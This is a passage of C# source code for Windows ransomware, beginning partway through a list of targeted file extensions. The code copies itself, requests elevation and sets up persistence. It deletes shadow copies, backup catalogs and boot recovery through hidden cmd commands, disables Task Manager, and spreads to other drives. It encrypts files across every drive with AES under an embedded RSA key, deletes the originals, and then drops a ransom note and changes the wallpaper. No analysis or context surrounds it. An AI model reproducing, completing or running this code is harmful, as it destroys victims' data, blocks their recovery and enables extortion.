		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (isOver())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					try
					{
						fileInfo.Attributes = FileAttributes.Normal;
					}
					catch
					{
					}
					string text = CreatePassword(40);
					if (fileInfo.Length < 1368709120)
					{
						if (checkDirContains(files[i]))
						{
							string keyRSA = RSA_Encrypt(text, rsaKey());
							AES_Encrypt(files[i], text, keyRSA);
						}
					}
					else
					{
						AES_Encrypt_Large(files[i], text, fileInfo.Length);
					}
					if (flag)
					{
						flag = false;
						string path = location + "/" + droppedMessageTextbox;
						string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
						if (!File.Exists(path) && location != folderPath)
						{
							File.WriteAllLines(path, messages);
						}
					}
				}
				catch (Exception)
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				try
				{
					new DirectoryInfo(directories[j]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (directory.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>6h5WgA5Hz80maLxhjyIUHx0O0+4mpHlQRJUDX5rpD72dOrVT1ARK3q6AB/Pv2wyA2wUTR55rozTwoOZTOemqFuBOq5ZyrECQv6NwoaQSGfjS/C04U80+U+W9eptqpz/omBteh7Ma+oczg/KBcgiuhkNHptECg1hZmfuJUq+9RVgID0PKDhxnULW/E/NFrkMjZRIjGS5vgVgM72F2Z+4c15+lykOqM9rCroLjIxpdN0SowCPUC09R3zPbhKIbgHRveOjlH8mG2b3/Yh6JS7fUnWlryBQmqjun4salCk+uzZHlhtNOyBOj6IqIBXV96TbhpDPBEjs9GbeWinrFF+SkFQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Small(string inputFile, string passwordBytes)
	{
		byte[] bytes = Encoding.ASCII.GetBytes(passwordBytes);
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream stream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.Zeros;
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(stream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			FileStream fileStream = new FileStream(inputFile, FileMode.Open);
			fileStream.CopyTo(cryptoStream);
			fileStream.Flush();
			cryptoStream.Flush();
			fileStream.Close();
			cryptoStream.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
